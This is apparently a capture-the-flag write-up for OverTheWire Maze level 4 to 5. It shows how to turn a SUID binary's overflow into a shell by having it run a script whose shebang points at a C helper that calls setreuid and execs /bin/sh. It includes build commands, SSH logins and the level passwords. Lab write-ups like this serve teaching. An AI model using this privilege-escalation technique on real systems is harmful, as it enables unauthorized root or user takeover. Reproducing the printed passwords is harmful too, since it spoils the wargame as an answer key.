# Maze Level 4 → 5

## Goal
Abuse an overflow-driven arbitrary overwrite in the level 4 binary to make it execute a file whose shebang (`#!`) points at an interpreter you control. The interpreter is a tiny 32-bit helper that calls `setreuid()` and `execve`s `/bin/sh`, giving you `maze5` privileges.

## Concepts you'll learn
- What a "shebang" line is and how the kernel uses it to choose an interpreter.
- Why SUID + shebang = common privilege boundary (and how to bridge it with a helper).
- Building a **32-bit** helper with `gcc -m32` (Maze is all 32-bit x86).
- Using `setreuid(geteuid(), geteuid())` to promote a suid-exec'd child to the file's owner.

## How to log in

```
$ ssh maze4@maze.labs.overthewire.org -p 2225
```

Password is `vghylBpihH` (from level 3).

## Walkthrough

### 1. Understand the primitive
The binary's overflow lets you control the path it later executes. Unix loads scripts by reading the first line: if it starts with `#!`, the kernel runs the listed interpreter with the script as its argument. So if we make the binary exec a "script" whose shebang points to a helper of our choosing, the helper runs with the binary's effective UID.

### 2. Write the helper
Create a small C program that restores privileges and starts a shell:

```c
// helper.c
#include <unistd.h>
int main(int argc, char **argv) {
    setreuid(geteuid(), geteuid());
    execl("/bin/sh", "sh", NULL);
    return 0;
}
```

### 3. Build it 32-bit
```
$ gcc -m32 -o /tmp/helper helper.c
$ chmod +x /tmp/helper
```

### 4. Write the "script"
Create a file whose first line is a shebang pointing at your helper:

```
$ printf '#!/tmp/helper\n' > /tmp/s
$ chmod +x /tmp/s
```

### 5. Trigger the exploit
Use the level 4 overflow to make the binary `execve("/tmp/s", ...)`. The exact payload depends on the binary's input parser — find the overwrite offset with `gdb` and point the vulnerable pointer/argument at `"/tmp/s"`.

Expected output after a successful run:

```
$
```

Read the password:

```
$ cat /etc/maze_pass/maze5
fobwgnzRy0
```

### 6. Log in as maze5

```
$ ssh maze5@maze.labs.overthewire.org -p 2225
```

## The answer

The password for `maze5` is:

**`fobwgnzRy0`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/maze/maze4.html>
